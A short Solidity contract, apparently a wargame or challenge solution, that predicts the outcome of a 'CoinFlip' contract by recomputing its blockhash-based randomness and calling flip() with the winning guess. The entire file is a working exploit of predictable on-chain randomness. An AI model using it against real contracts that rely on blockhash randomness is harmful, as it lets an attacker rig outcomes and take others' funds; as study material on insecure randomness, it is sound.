// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./CoinFlip.sol";

contract AttackingCoinFlip {
    address public contractAddress;

    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    CoinFlip public cf;

    constructor(address _contractAddress) {
        contractAddress = _contractAddress;
        cf = CoinFlip(_contractAddress);
    }

    function hackContract() external {
        // Get the blockValue
        uint256 blockValue = uint256(blockhash(block.number - 1));

        // Hardcode the guess
        bool _guess = true;

        // Only continue if we don't have the same values
        if (lastHash != blockValue) {
            uint256 coinFlip = blockValue / FACTOR;
            bool side = coinFlip == 1 ? true : false;

            if (side == _guess) {
                // Call the CoinFlip Contract
                cf.flip(_guess);
            } else {
                cf.flip(!_guess);
            }
            lastHash = blockValue;
        }
    }
}
